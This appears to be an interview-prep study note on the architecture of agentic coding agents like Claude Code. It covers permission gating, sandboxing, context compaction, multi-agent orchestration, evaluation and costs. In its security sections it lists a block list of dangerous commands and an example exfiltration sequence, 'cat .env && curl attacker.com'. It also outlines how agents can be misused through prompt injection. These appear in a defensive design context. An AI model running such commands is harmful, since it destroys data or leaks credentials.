# Claude Code Architecture

> **Last Updated:** 2026-05-31 | **Read time:** ~25 min | **Version:** 2.0

> **Navigation**: [[#Quick Catchup]] | [[#State of the Art]] | [[#Executive Summary]] | [[#Design Flow Framework]] | [[#System Design Walkthrough]] | [[#Interview Q&A Bank]] | [[#Distinguished Engineer Depth Probes]] | [[#Cost Model]] | [[#Observability & Production Debugging]] | [[#Data Flywheel & Continuous Improvement]] | [[#Advanced Patterns Summary]] | [[#Seniority Signals Cheat Sheet]] | [[#References]]

---

## Quick Catchup

> **Quick Catchup (May 2026):** Agentic coding has evolved from IDE-centric autocomplete to terminal-native autonomous agents executing full development workflows.
> Key players: Claude Code, SWE-agent [6], OpenDevin [10], AutoCodeRover [7]. Main open problem: reliable long-horizon task completion beyond single-file edits.
> Recent breakthrough: SWE-bench Verified passing 70%+ (early 2026). Trend direction: toward spec-driven multi-agent orchestration with human-in-the-loop supervision.


## State of the Art

### Current Best Approaches
- **ReAct-style agentic loops** — interleave reasoning and tool actions in a continuous cycle until task completion [3]
- **Agent-Computer Interfaces (ACI)** — purpose-built tool interfaces for code navigation and editing, as in SWE-agent [6]
- **Multi-agent orchestration** — delegate sub-tasks to specialized agents running in isolated worktrees [8][9]
- **Spec-driven execution** — use structured manifests (CLAUDE.md) for persistent project context rather than conversational prompts [11]

### Recent Breakthroughs (last 12 months)
- **SWE-bench Verified 70%+** (Q1 2026): Claude-based agents crossed the threshold on verified real-world GitHub issues [1]
- **Sub-agent worktree isolation** (Q3 2025): parallel agent execution via Git worktrees eliminated file-level conflicts [11]
- **Context compaction at 200K tokens** (Q4 2025): hierarchical summarization pipelines enabling 8+ hour coding sessions [11]
- **MCP ecosystem maturation** (2025-2026): Model Context Protocol reached 100+ production integrations [11]

### Open Problems
- Context corruption in sessions exceeding 4 hours despite compaction pipelines
- Permission fatigue — users rubber-stamp dangerous operations after repeated prompts
- Measuring agent quality beyond pass/fail (partial correctness, code style, maintainability)
- Multi-agent coordination overhead exceeding parallelism benefits for small tasks

### Benchmark Standings

| Benchmark | SOTA System | Score | Date |
|-----------|-------------|-------|------|
| SWE-bench Verified | Claude Code (agentic) | ~72% resolved | Q1 2026 |
| SWE-bench Lite | SWE-agent + Claude | 64% resolved | 2024 [6] |
| HumanEval | GPT-4/Claude | 90%+ pass@1 | 2024 [2] |
| MBPP | Code Llama 70B | 77% pass@1 | 2024 [13][14] |


## Executive Summary

Claude Code is a terminal-native autonomous software engineering agent that executes complete development workflows — not a code-suggestion tool. The core architectural decision is **agentic loop with tool execution and permission gating** versus **IDE-embedded autocomplete**: choose agentic when tasks span multiple files, require shell access, or run longer than 5 minutes. **The killer interview framing: "This is an autonomous runtime with shell access and a permission model — the hard problems are context retention across hours, safe execution with blast-radius control, and knowing when to stop."** At production scale, per-task cost ranges $0.80-$2.00 with 60-80% developer time savings.

```
Input Prompt ──► Orchestration Loop ──► Tool Execution ──► Result Collection
                    │        ▲                                    │
                    ▼        │                                    ▼
              Permission ◄── Context Manager ◄── Compaction ◄── Output
              Gating         (5-layer hierarchy)
```


## Design Flow Framework

| Step | Focus | Key Decisions |
|------|-------|---------------|
| 1. Clarify requirements | Agent scope and autonomy level | Fully autonomous vs. human-in-the-loop; single-repo vs. multi-repo; session duration expectations |
| 2. Identify constraints | Security, context, and scale boundaries | Max context window, shell access scope, credential isolation needs, compliance requirements |
| 3. Propose baseline | Minimal viable agent loop | ReAct-style orchestration [3] with file edit + shell tools, simple approval gates, CLAUDE.md manifest |
| 4. Identify gaps | Where baseline fails under load | Context loss after 1 hour, permission fatigue, tool timeout cascades, no parallelism |
| 5. Introduce improvements | Targeted fixes for each gap | 5-layer compaction, risk-adaptive gating, sub-agent delegation [8], circuit breakers |
| 6. Add evaluation + guardrails | Safety and quality metrics | SWE-bench pass rate [1], context retention accuracy, sandbox escape detection, approval audit trails |
| 7. Discuss scaling tradeoffs | What breaks at 10x/100x | Context cost explosion, multi-agent coordination overhead, permission system bottlenecks |

### Decision Matrix

| Decision | Option A | Option B | Choose A when... | Choose B when... |
|----------|----------|----------|------------------|------------------|
| Agent autonomy | Semi-autonomous with approval gates | Fully autonomous sandboxed | Sensitive codebases, compliance needs | Repetitive automation, trusted environments |
| Context strategy | Stateless with manifests | Persistent hierarchical memory | Simple tasks, clear boundaries | Multi-hour sessions, evolving requirements |
| Tool integration | Direct shell execution | MCP-mediated external systems | Local dev environments | Enterprise multi-system workflows |
| Architecture | Single-agent orchestration | Multi-agent delegation [8] | Linear workflows, debugging simplicity | Complex parallel tasks, specialization |
| Execution model | Synchronous blocking | Async with worktree isolation | Sequential dependencies | Independent sub-tasks |


## System Design Walkthrough

### Opening Frame

Building agentic coding systems requires solving three hard problems simultaneously: retaining decision context across hours of execution, constraining autonomous shell access without creating approval fatigue, and detecting task completion without ground-truth oracles. The system is a distributed runtime where one node is an LLM with unpredictable failure modes.

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│                 Claude Code Agent Runtime                 │
├──────────────┬──────────────┬──────────────┬────────────┤
│ Orchestration│ Permission   │ Context      │ Sub-Agent  │
│ Loop         │ Gating       │ Manager      │ Delegator  │
│ - Model call │ - Risk class │ - 5-layer    │ - Worktree │
│ - Tool pick  │ - Approval   │   compaction │   isolation│
│ - Result agg │ - Sandbox    │ - Retrieval  │ - Merge    │
├──────────────┴──────────────┴──────────────┴────────────┤
│ Tool Execution Layer: Shell | File Edit | Git | MCP     │
├─────────────────────────────────────────────────────────┤
│ Safety: gVisor containers | Egress control | Credential│
│         isolation | Audit logging                       │
└─────────────────────────────────────────────────────────┘
```

- **Orchestration Loop**: Continuous model-tool-result cycle with error recovery and state persistence [3]
- **Permission Gating**: Multi-tier approval with command classification and dynamic risk thresholds
- **Context Manager**: Hierarchical memory (1:1 to 200:1 compression) enabling multi-hour coherence
- **Sub-Agent Delegator**: Spawns specialized agents in isolated Git worktrees for parallel work [8]
- **Safety Layer**: VM/container isolation preventing credential leakage and destructive operations

### Key Gaps & Improvements

| Gap | Improvement | Trade-off |
|-----|-------------|-----------|
| Context loss after 2+ hours | 5-layer hierarchical compaction with causal graph preservation | 3x storage for 10x session reliability |
| Permission fatigue | Risk-adaptive gating with ML-based operation classification | 40% more approvals for 90% fewer incidents |
| Tool timeout cascades | Circuit breakers with graceful degradation and fallback tools | Reduced capability vs. total failure |
| Multi-agent file conflicts | Git worktree isolation with merge coordination | 4x disk space for 3x throughput |
| Spec drift in manifests | Auto-validating CLAUDE.md with drift detection | Maintenance overhead vs. spec freshness |

### Scaling Summary
- **10x (10K devs)**: Context storage becomes bottleneck; implement distributed memory with async compaction
- **100x (100K ops/day)**: Permission system overwhelmed; ML-based auto-approval for low-risk operations
- **1000x (Enterprise)**: Multi-tenancy; organization-level policy engines, federated identity, audit trails


## Interview Q&A Bank

### Q1: What is the fundamental architecture of an agentic coding system like Claude Code?

> **Quick answer:** A continuous orchestration loop that calls the model, selects tools, executes actions, collects results, and updates context until task completion — fundamentally different from stateless autocomplete.

The architecture follows the ReAct pattern [3]: at each step, the model reasons about the current state, selects a tool action (file edit, shell command, git operation), executes it, observes the result, and decides the next step. The loop continues until the agent determines the task is complete or encounters an unrecoverable failure. Supporting subsystems handle context management (retaining information across hundreds of iterations), permission gating (preventing dangerous operations), and tool orchestration (managing external system interactions via MCP). The key insight from Toolformer [4] is that LLMs can learn effective tool use through self-supervised signals, but production systems require explicit safety boundaries that go beyond what the model internalizes.

**Hard follow-up:** How does this differ from chain-of-thought prompting without tool use?

> Chain-of-thought operates entirely within the model's context window without environmental feedback. Agentic loops ground reasoning in real execution results — test failures, compiler errors, git conflicts — creating a closed feedback loop that converges on working solutions [3][5].

### Q2: How does the permission gating system prevent autonomous agents from causing damage?

> **Quick answer:** Multi-tier classification of operations by risk level, with automatic execution for safe operations, approval gates for dangerous ones, and hard blocks for prohibited actions.

Operations are classified into tiers: read-only (auto-approve), write-local (auto-approve with logging), write-destructive (require approval), network-egress (require approval), and credential-access (hard block without explicit grant). The system tracks operation sequences to detect escalation patterns — individually safe operations that combine into dangerous workflows. Sandboxing via gVisor containers provides defense-in-depth: even approved operations execute in isolation with restricted network access and filesystem scope [11].

| Risk Tier | Example | Policy |
|-----------|---------|--------|
| Read-only | `cat`, `grep`, `git log` | Auto-approve |
| Write-local | File edits in project dir | Auto-approve + log |
| Write-destructive | `rm -rf`, `git reset --hard` | Require approval |
| Network-egress | `curl`, API calls | Require approval |
| Credential-access | `.env` reads, key usage | Hard block by default |

**Hard follow-up:** How do you handle approval fatigue when users rubber-stamp everything?

> Implement adaptive approval: after N consecutive approvals, the system summarizes pending operations in a batch with risk scores, forcing the user to acknowledge aggregate risk rather than individual low-signal prompts. Track approval velocity — rapid consecutive approvals trigger additional confirmation for high-risk items.

### Q3: Explain the five-layer context compaction pipeline and why naive approaches fail.

> **Quick answer:** Progressive hierarchical compression from full-fidelity recent context (1:1) to highly compressed project state (200:1), preserving causal dependencies rather than optimizing for semantic similarity alone.

Naive summarization fails because it optimizes for textual coherence rather than decision-critical information. A variable binding defined 2 hours ago may be critical for current debugging but has low semantic similarity to the current query. The five layers are: (1) active buffer — last 4K tokens uncompressed, (2) recent history — 3:1 compression with command-result preservation, (3) session summary — 10:1 with decision node extraction, (4) architectural state — 50:1 with dependency graph maintenance, (5) project manifest — 200:1 static repository context. Each layer uses different compression objectives: recency weighting at L1, causal graph preservation at L2-L3, and structural invariant extraction at L4-L5.

**Hard follow-up:** What information-theoretic bound constrains this compression?

> The system must satisfy `H(A_{t+1}|C'_t) approximately equals H(A_{t+1}|C_t)` — compressed context must preserve the conditional entropy of future agent decisions. This means lossy compression of narrative is acceptable but lossy compression of causal chains is catastrophic.

### Q4: What is the Model Context Protocol (MCP) and why does it matter architecturally?

> **Quick answer:** A standardized protocol for AI agents to connect to external systems (Slack, GitHub, databases), serving as "HTTP for AI agents" and creating ecosystem-breadth competitive advantages.

MCP abstracts away API format differences, authentication methods, and data schemas into a uniform tool interface [11]. Architecturally, it decouples the agent from specific integrations: new MCP servers can be added without modifying agent code, enabling a plugin ecosystem. The strategic insight is that competitive moats are shifting from model quality to ecosystem connectivity — the agent with the broadest tool graph wins. MCP servers handle pagination, error recovery, and rate limiting independently, preventing external system failures from corrupting agent state.

**Hard follow-up:** How do you handle MCP server failures without corrupting agent context?

> Implement circuit breakers per MCP server with graceful degradation. Failed tool calls return structured error objects that the agent can reason about ("Slack unavailable, will retry in 5 minutes") rather than crashing the loop. Maintain a health registry that routes around unhealthy servers.

### Q5: How do repository manifests (CLAUDE.md) work and what problem do they solve?

> **Quick answer:** Machine-readable project specifications that provide persistent, structured context about coding conventions, architecture, and workflows — solving the "cold start" problem for agents entering unfamiliar codebases.

CLAUDE.md transforms prompts into versioned infrastructure. Rather than relying on ad-hoc instructions, agents consume structured manifests containing build commands, architectural principles, testing procedures, and coding standards. Research on 253 CLAUDE.md files shows they significantly reduce agent errors on repository-specific tasks [11]. They integrate with the context manager as high-priority L4/L5 content that survives aggressive compression — architectural decisions in the manifest are never compacted away.

**Hard follow-up:** How do you prevent manifest staleness as the codebase evolves?

> Implement drift detection that compares manifest claims against actual codebase state (e.g., "we use Jest" vs. actual test framework in package.json). Flag contradictions and surface them during agent initialization. Optionally auto-update manifests after validated structural changes.

### Q6: Describe the multi-agent orchestration architecture and when to use it.

> **Quick answer:** A primary orchestrator spawns specialized sub-agents in isolated Git worktrees for parallel execution — use when tasks decompose into independent sub-problems that would serialize in a single-agent loop.

The orchestrator decomposes tasks and delegates to specialists: one agent handles architecture exploration, another writes tests, a third implements features, and a fourth validates integration [8][9]. Worktree isolation ensures agents cannot corrupt each other's changes. The merge phase resolves conflicts using dependency-aware ordering. The key trade-off: orchestration overhead (context duplication, coordination messages, merge resolution) only pays off when sub-tasks are genuinely independent. For tightly coupled changes, single-agent execution with a longer context window outperforms multi-agent.

**Hard follow-up:** How do you handle merge conflicts when sub-agents modify related code?

> Implement dependency analysis before delegation: if task decomposition reveals shared-file dependencies, either serialize those sub-tasks or designate one agent as the "owner" of contested files. Post-execution, use semantic merge (understanding code intent) rather than textual merge to resolve remaining conflicts.

### Q7: What are the primary production failure modes in agentic coding systems?

> **Quick answer:** Context corruption (18% of failures), tool execution errors (28%), API timeouts (35%), and permission misconfigurations (7%) — building reliable agents is a distributed systems problem, not a model quality problem.

The most dangerous failures are "silent wrongness" — the agent completes tasks successfully but with subtle errors that compound. Context corruption from aggressive compaction loses critical variable bindings. Tool execution failures cascade when shell commands timeout and the agent retries with different (wrong) assumptions. Reflexion-style self-correction [5] helps but cannot recover from lost context state. Production systems require checkpointing every N operations, enabling rollback to last known good state when corruption is detected.

**Hard follow-up:** How do you detect silent wrongness before users notice?

> Implement "shadow validation" — after task completion, run a lightweight verification agent that checks output consistency against the original intent. Track decision confidence distributions over time; sudden drops indicate reasoning degradation even when outputs appear correct.

### Q8: How does sandboxing and containment work for autonomous agents with shell access?

> **Quick answer:** Defense-in-depth via gVisor containers, filesystem scoping, network egress controls, and credential isolation — model safety alone is insufficient when the model has `exec` capabilities.

The containment architecture assumes each layer may fail: filesystem restrictions limit write access to project directories, gVisor provides syscall-level isolation, network policies block unauthorized egress, and credential stores use time-limited tokens that the agent cannot persist. The blast radius of a compromised agent is bounded to the current project directory with no lateral movement capability. This represents the shift from "content safety" (preventing harmful text) to "operational safety" (containing execution impact) [11].

**Hard follow-up:** What is the performance cost of this isolation?

> gVisor adds 10-20% overhead on syscall-heavy workloads (file I/O, process spawning). The trade-off is acceptable because agent tool execution is I/O-bound on model inference latency, not syscall throughput. Network policy enforcement adds <1ms per connection.

### Q9: How does Reflexion-style self-correction improve agent task completion?

> **Quick answer:** Agents that reflect on failures, generate verbal feedback, and retry with modified approaches achieve significantly higher task completion than single-attempt agents [5].

Reflexion [5] introduces an episodic memory of past failures that the agent consults before retrying. When a test fails, the agent generates a "reflection" explaining what went wrong and stores it. On retry, this reflection biases the agent away from the same mistake. In agentic coding, this manifests as: run tests, observe failure, diagnose root cause, edit with awareness of the failure mode. The limitation is that reflection quality depends on accurate failure attribution — if the agent misdiagnoses why something failed, it spirals into increasingly wrong solutions.

**Hard follow-up:** How do you prevent reflection spirals where the agent keeps trying the same failed approach with minor variations?

> Implement a "novelty detector" that measures semantic distance between successive attempts. If attempts converge (cosine similarity > 0.9), force the agent to try a fundamentally different approach or escalate to a human. Cap retries at 3-5 with mandatory strategy changes between attempts.

### Q10: How do Agent-Computer Interfaces (ACI) differ from giving agents raw shell access?

> **Quick answer:** ACIs provide purpose-built tools for code navigation and editing (search, open file, scroll, edit range) that constrain the action space to productive operations, improving success rates over raw shell [6].

SWE-agent [6] demonstrated that custom interfaces outperform raw shell access because they reduce the decision space from arbitrary bash commands to a focused set of code-relevant actions. The ACI includes file search, context-aware navigation, bounded edits, and test execution — operations that map directly to developer workflows. This reduces both error rate (no accidental `rm -rf`) and reasoning load (fewer possible actions to evaluate). Claude Code takes a hybrid approach: ACI-style tools for code operations with guarded shell access for operations that need full system capability.

**Hard follow-up:** What is the trade-off between ACI constraints and agent capability?

> Overly constrained ACIs prevent agents from solving problems that require creative system interactions (piping, scripting, installing dependencies). The optimal design offers structured tools for common operations with an escape hatch to supervised shell access for edge cases [6][10].

### Q11: How do you evaluate whether an agentic coding system actually works?

> **Quick answer:** SWE-bench [1] for end-to-end task completion on real GitHub issues, HumanEval/MBPP [2][13] for code generation correctness, and pass@k metrics [12] for measuring reliability across attempts.

Evaluation requires multiple levels: unit-level correctness (does generated code pass tests), task-level completion (does the agent resolve the full issue), and system-level reliability (what fraction of tasks succeed without human intervention). SWE-bench [1] is the gold standard for agentic evaluation because it uses real GitHub issues with real test suites — no synthetic benchmarks. AlphaCode [12] introduced pass@k to measure how many samples are needed for at least one correct solution, revealing the gap between best-case and expected-case performance. The open challenge is evaluating code quality beyond correctness — maintainability, efficiency, and style remain subjective.

**Hard follow-up:** Why is SWE-bench insufficient as a sole evaluation metric?

> SWE-bench issues are biased toward well-specified bug fixes with clear test suites. Real development involves ambiguous requirements, architectural decisions, and multi-step workflows without ground-truth tests. Complement with human evaluation of open-ended tasks and longitudinal tracking of agent-generated code in production [1][7].

### Q12: What is the future trajectory of agentic coding systems?

> **Quick answer:** Toward autonomous software factories where agents handle full development lifecycles — from issue triage through deployment — with humans providing strategic direction and quality oversight.

The trajectory follows: (1) autocomplete (Copilot era), (2) single-task agents (current), (3) session-persistent agents handling multi-step workflows, (4) multi-agent teams with specialization [8][9], (5) autonomous development pipelines with human supervision. MetaGPT [9] demonstrates role-based multi-agent software development. OpenDevin [10] provides open platforms for agent development. The fundamental shift is from "AI writes code" to "AI operates as a junior developer" — with all the supervision, review, and trust-building that implies. The LLM-based agents survey [15] maps this trajectory across planning, memory, and tool-use dimensions.

> [!experience]
> At Amazon Ads, early experiments with supervisory engineering patterns showed 3-5x velocity improvements for routine tasks, but required 6-12 months of investment in manifest quality and team workflow adaptation before reaching steady-state productivity.

**Hard follow-up:** What prevents fully autonomous development today?

> Three gaps: (1) agents cannot reliably determine when a task is "done" without external test suites, (2) long-horizon planning degrades as context compounds errors over hours, (3) agents lack the judgment to know when to ask for clarification versus making assumptions. These are fundamentally harder than code generation.


## Distinguished Engineer Depth Probes

<details><summary><strong>DE Probe 1 (MATH): Context Window Compaction — Summarization Quality-Fidelity Trade-offs</strong></summary>

**Question**: Design the mathematical framework for context compaction that preserves decision-critical information. Why does optimizing for ROUGE or BERTScore during summarization destroy agent coherence?

The fundamental challenge is that agent coherence depends on preserving **causal chains** across decision boundaries, but standard summarization metrics optimize for **surface-level semantic similarity** rather than decision-critical information retention.

**Formal objective**: Given context `C_t` of length `L`, produce `C'_t` of length `L' << L` such that:
```
H(A_{t+1} | C'_t) ≈ H(A_{t+1} | C_t)
```
where `A_{t+1}` represents future agent actions. This requires preserving mutual information `I(C_t; A_{t+1})` — the information in context that determines future decisions.

**Why ROUGE/BERTScore fail**: These metrics measure `sim(C_t, C'_t)` — similarity between original and compressed text. But decision-critical information is sparse: a single `config = load_env("prod")` binding may determine 50 subsequent operations while representing 0.01% of tokens. ROUGE cannot distinguish this from surrounding narrative.

**Causal dependency preservation** requires building a directed acyclic graph `G = (V, E)` where vertices are state-changing operations and edges are data dependencies:
```python
def causal_compress(context, target_length):
    G = build_dependency_graph(context.operations)
    # PageRank identifies high-impact nodes (many downstream dependents)
    importance = pagerank(G, damping=0.85)
    critical_set = top_k(importance, k=target_length // avg_node_size)
    # Preserve all edges between retained nodes
    return subgraph(G, critical_set, preserve_transitive_edges=True)
```

**Compression ratio bounds**: For a session with `n` operations and average dependency depth `d`, the minimum context to preserve full causal structure is `O(n * d / n) = O(d)` — independent of session length for bounded-depth workflows. This explains why well-structured tasks (clear dependencies) compress better than exploratory sessions (dense dependency graphs).

**Production failure mode**: Variable shadowing across compression boundaries. Agent defines `API_KEY = fetch_secret("prod")` at t=10, references it at t=500. Naive compression drops the binding, agent re-fetches with test credentials, silently corrupts production data. Causal graph preservation retains the binding because downstream operations depend on it regardless of recency [11].

</details>

<details><summary><strong>DE Probe 2 (SYSTEMS): Tool Execution Sandboxing — Permission Models and Blast-Radius Control</strong></summary>

**Question**: Design a permission system for an autonomous agent with shell access. How do you bound blast radius while avoiding the false-safety of overly permissive approval gates?

The core tension: restrict too little and agents delete databases; restrict too much and approval fatigue causes users to rubber-stamp everything, providing zero actual safety.

**Threat model layers**:
1. **Accidental damage**: Agent misinterprets task, runs destructive command
2. **Prompt injection**: Malicious content in codebase triggers harmful actions
3. **Capability escalation**: Individually safe operations compose into dangerous workflows
4. **Data exfiltration**: Agent reads credentials and sends them to external endpoints

**Defense-in-depth architecture**:
```
Layer 1: Static analysis — parse command before execution
         Block: rm -rf /, chmod 777, curl | bash
Layer 2: Dynamic sandboxing — gVisor syscall interception
         Restrict: filesystem scope, network egress, process spawning
Layer 3: Behavioral monitoring — sequence analysis across operations
         Detect: credential read followed by network write
Layer 4: Approval gates — human verification for high-risk operations
         Adaptive: batch low-risk, highlight high-risk, summarize medium-risk
```

**Blast-radius formalization**: Define `B(op)` as the maximum damage from operation `op`:
```
B(op) = scope(op) × reversibility(op)^{-1} × sensitivity(data_accessed)
```
Operations with `B(op) > threshold` require approval. The key insight: `B` must be computed over **operation sequences**, not individual commands. `cat .env` has low B; `cat .env && curl attacker.com` has extreme B. The system maintains a sliding window of recent operations to compute sequence-level blast radius [11].

**Approval fatigue mitigation**: Instead of per-operation approval, implement **budget-based authorization**. Users grant a "risk budget" per session (e.g., "allow up to 5 file deletions in /tmp, 0 in /src"). The agent operates freely within budget, requests approval only when budget is exhausted. This reduces approval events by 80% while maintaining safety for operations that exceed the declared scope.

**Isolation implementation**: gVisor provides syscall-level interposition with 10-20% overhead. Network namespaces prevent egress. Filesystem overlays enable copy-on-write isolation where changes are staged and committed only after validation. This matches container security patterns from Toolformer-era tool use [4] but applied to full shell access.

</details>

<details><summary><strong>DE Probe 3 (DATA): Agentic Loop Convergence — Task Completion Detection and Loop Avoidance</strong></summary>

**Question**: How does an agent determine when a task is "done" without ground-truth oracles? Design a convergence criterion that prevents both premature termination and infinite loops.

This is fundamentally an **optimal stopping problem** [3][5]. The agent must balance exploration (trying more approaches) against exploitation (committing to current solution) without access to a ground-truth reward signal.

**Convergence signals** (ordered by reliability):
1. **Test suite passes** — strongest signal but unavailable for many tasks
2. **Self-consistency check** — agent re-reads its output and confirms it satisfies the prompt
3. **Diminishing returns** — successive iterations produce decreasing delta in output
4. **Confidence threshold** — model's expressed uncertainty drops below threshold

**Formal stopping criterion**: Define `V_t` as the value of continuing at step `t`:
```
V_t = E[reward_{t+1:T}] - cost_{t+1:T}
Stop when V_t ≤ 0, i.e., expected future improvement ≤ expected future cost
```

In practice, estimate `V_t` through:
```python
def should_stop(history, max_iterations=50):
    if len(history) >= max_iterations:
        return True  # Hard cap prevents runaway
    
    # Diminishing returns: output similarity between last 3 iterations
    if len(history) >= 3:
        recent_deltas = [edit_distance(history[i], history[i-1]) 
                        for i in range(-1, -3, -1)]
        if all(d < threshold for d in recent_deltas):
            return True  # Converged — changes are cosmetic
    
    # Loop detection: have we seen this state before?
    state_hash = hash(history[-1].relevant_state)
    if state_hash in seen_states:
        return True  # Cycling — abort
    
    return False
```

**Loop avoidance**: Reflexion [5] showed that agents can get stuck in "reflection spirals" — repeatedly diagnosing the same failure without progress. Detect via embedding similarity between successive reasoning traces. If `cosine(reason_t, reason_{t-1}) > 0.92`, force a strategy change: try a different approach, decompose differently, or escalate to human.

**The "done but wrong" problem**: Agents that declare completion confidently but produce incorrect output. Mitigate with mandatory self-verification: before declaring done, the agent must execute a validation step (run tests, re-read requirements, check edge cases). SWE-agent [6] implements this as a final "review" action before submitting patches.

</details>

<details><summary><strong>DE Probe 4 (EVALUATION): Measuring Agent Coding Quality — Beyond Pass/Fail Metrics</strong></summary>

**Question**: SWE-bench gives binary pass/fail. Design an evaluation framework that captures partial correctness, code quality, and efficiency for agentic coding systems.

**Limitations of current benchmarks**: SWE-bench [1] measures "does the patch resolve the issue" — binary. HumanEval [2] measures "does the function pass unit tests" — also binary. Neither captures: Was the solution maintainable? Did it introduce technical debt? Was it efficient? Did it follow project conventions?

**Multi-dimensional evaluation framework**:

| Dimension | Metric | Measurement |
|-----------|--------|-------------|
| Functional correctness | pass@k [2][12] | Fraction of k samples with at least one passing solution |
| Patch minimality | Lines changed / optimal lines | Compare against human-authored ground truth patches |
| Code quality | Linter score delta | Did the patch improve or degrade code quality? |
| Efficiency | Runtime/memory regression | Benchmark before/after on affected code paths |
| Convention adherence | Style match score | Embedding similarity to surrounding code patterns |
| Robustness | Mutation testing survival | Does the patch handle edge cases the tests don't cover? |

**pass@k estimation** [2][12]: Generate `n` solutions, count `c` correct ones, estimate:
```
pass@k = 1 - C(n-c, k) / C(n, k)
```
This unbiased estimator reveals the gap between best-case (pass@100) and expected-case (pass@1) performance. AlphaCode [12] showed that filtering + clustering large sample sets dramatically improves effective pass@k.

**Partial credit scoring**: For patches that fail tests, measure "distance to correct":
```
partial_score = (tests_passed_after - tests_passed_before) / tests_failed_initially
```
An agent that fixes 3/5 failing tests deserves more credit than one that fixes 0/5.

**AutoCodeRover evaluation** [7]: Demonstrated that agents solving real GitHub issues need evaluation beyond test passage — measuring whether the fix addresses root cause versus surface symptoms. A patch that passes tests by disabling the failing test scores pass@1=1 but has zero actual value.

**Open challenge**: No automated metric reliably captures "this code will be maintainable in 6 months." Human evaluation remains necessary for architectural decisions, naming quality, and design pattern appropriateness [1][13].

</details>

<details><summary><strong>DE Probe 5 (PRODUCTION): Multi-File Edit Coordination — Dependency Ordering and Atomic Commits</strong></summary>

**Question**: An agent must modify 12 files across 3 packages to implement a feature. Design the coordination system that ensures consistency, handles partial failures, and produces atomic commits.

**The consistency challenge**: Files have dependency relationships — modifying an interface without updating implementations creates type errors. The agent must determine edit ordering, validate intermediate states, and roll back cleanly on failure.

**Dependency-aware edit planning**:
```python
def plan_edits(task, codebase):
    # Build dependency graph from imports/references
    dep_graph = analyze_dependencies(affected_files(task))
    
    # Topological sort: edit interfaces before implementations
    edit_order = topological_sort(dep_graph, reverse=True)
    
    # Group by atomic units (files that must change together)
    atomic_groups = strongly_connected_components(dep_graph)
    
    return EditPlan(order=edit_order, atomic_groups=atomic_groups)
```

**Atomic commit strategy**: Each atomic group is committed together. If any file in the group fails validation (type check, lint, test), the entire group is rolled back:
```
Phase 1: Stage all files in atomic group to overlay filesystem
Phase 2: Run validation (typecheck, lint, affected tests)
Phase 3: If pass → commit overlay to working tree
          If fail → discard overlay, diagnose, retry
```

**Partial failure recovery**: When file 7/12 fails, the system must decide: (a) roll back all changes, (b) keep successful groups and retry only the failed group, or (c) attempt alternative implementation of the failed change. The decision depends on whether completed groups are independently valid — interface changes without implementation updates are never independently valid.

**Production patterns from OpenDevin** [10]: Edit operations should be idempotent where possible. Rather than "insert line 47", prefer "ensure function X has parameter Y" — this survives re-execution after partial failures. SWE-agent [6] uses bounded edit operations (edit specific line ranges) that minimize conflict surface between successive edits.

**Conflict detection across sub-agents**: When multiple agents edit related files in parallel (via worktree isolation), pre-merge validation checks for semantic conflicts: interface changes that invalidate another agent's implementation, test modifications that conflict with feature code, and dependency additions that conflict.

> [!experience]
> In large-scale campaign systems, we found that multi-file changes failing at file 8/12 required full rollback 60% of the time because earlier "successful" edits depended on assumptions that the failed edit was supposed to establish. Implementing dependency-graph-aware atomic groups reduced rollback frequency to 15%.

</details>

<details><summary><strong>DE Probe 6 (ARCHITECTURE): Sub-Agent Orchestration — Delegation, Parallel Execution, and Result Aggregation</strong></summary>

**Question**: Design the orchestration layer for a multi-agent coding system. How do you decompose tasks, manage parallel execution, and aggregate results while bounding coordination overhead?

**Orchestration architecture** follows the "coordinator-worker" pattern from distributed systems, adapted for LLM agents [8][9]:

```
Coordinator Agent
├── Task Decomposition (analyzes dependencies, identifies parallelism)
├── Worker Pool Management (spawns/terminates sub-agents)
├── Result Aggregation (merges outputs, resolves conflicts)
└── Progress Monitoring (detects stalls, triggers recovery)

Worker Agent (per worktree)
├── Isolated Git Worktree (no file conflicts between workers)
├── Scoped Context (only receives relevant sub-task context)
├── Local Tool Access (sandboxed to worktree directory)
└── Completion Signal (reports done/failed/blocked)
```

**Task decomposition criteria** — parallelize when:
1. Sub-tasks have no data dependencies (independent modules)
2. Sub-tasks modify disjoint file sets (no merge conflicts)
3. Expected parallel speedup exceeds coordination overhead

**Coordination overhead model**: For `n` agents with communication cost `c` per message pair:
```
Total_cost = n × task_cost + C(n,2) × c × sync_frequency
```
Parallelism pays off when `n × task_cost / (task_cost + coordination)` > 1. In practice, n=3-5 agents is the sweet spot; beyond that, coordination overhead dominates [8].

**Result aggregation strategies**:
- **Sequential merge**: Apply patches in dependency order (safest, slowest)
- **Semantic merge**: Understand code intent, resolve conflicts by meaning (complex, most capable)
- **Conflict escalation**: If automatic merge fails, present conflict to coordinator for re-delegation

**MetaGPT** [9] assigns roles (architect, engineer, tester) with standardized communication protocols (SOPs). Each role has different tool access and context scope. The architect sees the full codebase; engineers see only their assigned modules; testers see interfaces and specifications.

**AutoGen** [8] provides the foundational multi-agent conversation framework where agents communicate through structured messages. The key insight: agent-to-agent communication should be structured (function calls, schemas) not conversational (natural language), reducing ambiguity and enabling automated validation of inter-agent contracts.

**Failure handling**: If a worker agent fails, the coordinator must decide: retry with same context, retry with different decomposition, absorb the sub-task into another worker, or escalate to single-agent execution. Track per-worker failure rates to identify systematic decomposition problems versus transient failures.

</details>


## Cost Model

### Per-Task Cost Breakdown

| Component | Unit Cost | Per-Task Usage | Cost |
|-----------|-----------|----------------|------|
| LLM Inference (input) | $3.00/1M tokens | 150K tokens avg | $0.450 |
| LLM Inference (output) | $15.00/1M tokens | 25K tokens avg | $0.375 |
| Context compaction | $0.50/1M tokens | 75K tokens processed | $0.038 |
| Tool execution compute | $0.12/vCPU-hour | 0.25 hours avg | $0.030 |
| Sandbox/isolation | $0.08/container-hour | 0.5 hours | $0.040 |
| MCP protocol calls | $0.02/call | 15 external calls | $0.300 |
| **Total per task** | | | **$1.23** |

### Monthly Cost at Scale

| Scale | Tasks/Month | Compute | Context Overhead | Total | Per-User |
|-------|-------------|---------|------------------|-------|----------|
| Startup (1K devs) | 50K | $61K | $12K | $73K | $73 |
| Mid-market (10K) | 500K | $615K | $123K | $738K | $74 |
| Enterprise (100K) | 5M | $6.2M | $930K | $7.1M | $71 |

### Cost Optimization Priority Stack

1. **Context compression** (40-60% savings): Hierarchical summarization reduces active context by 70%
2. **Model routing** (15-25% savings): Use smaller models for simple edits, large models for reasoning
3. **Tool result caching** (20-30% savings): Cache shell/test outputs with file-change invalidation
4. **Multi-agent batching** (10-20% savings): Shared context pools reduce duplication overhead

